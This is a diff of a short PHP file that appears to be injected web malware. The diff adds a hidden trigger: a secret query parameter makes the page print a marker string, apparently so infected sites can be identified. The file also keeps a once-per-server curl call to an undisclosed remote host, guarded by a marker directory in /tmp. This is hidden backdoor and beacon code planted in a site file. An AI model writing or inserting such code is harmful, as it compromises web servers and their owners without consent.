@@ -1,12 +1,9 @@
 <?php 
+if(isset($_GET["sexx"])&&$_GET["sexx"]=="sec"){ echo('Apache Hec'); }
 $random = rand(1,6);
-$rand="dce";
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists($_SERVER['DOCUMENT_ROOT']."/cgi-bin/".$random.$rand))
-	{
-		
-	}
-else {
+if(file_exists('/tmp/d3d3dbb'.$d.$random)) { } else {
+	mkdir('/tmp/d3d3dbb'.$d.$random);
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
@@ -15,8 +12,4 @@ else {
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
-	fopen($_SERVER['DOCUMENT_ROOT']."/cgi-bin/".$random.$rand, "w");
-}
-	
-?>
+} ?>
